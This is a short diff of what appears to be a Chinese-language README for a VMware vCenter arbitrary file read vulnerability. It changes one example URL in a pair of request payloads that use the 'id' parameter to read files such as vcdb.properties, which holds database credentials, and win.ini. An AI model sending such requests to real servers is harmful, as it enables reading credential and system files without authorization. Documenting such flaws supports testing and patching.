@@ -10,7 +10,7 @@ e.g.
 
 ```
 https://www.jas502n.com/eam/vib?id=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties
-https://www.jas502n.com/eam/vib?id=C:\Windows\win.ini
+https://www.jas502n.com/eam/vibd?id=C:\Windows\win.ini
 ```
 
 测试环境：
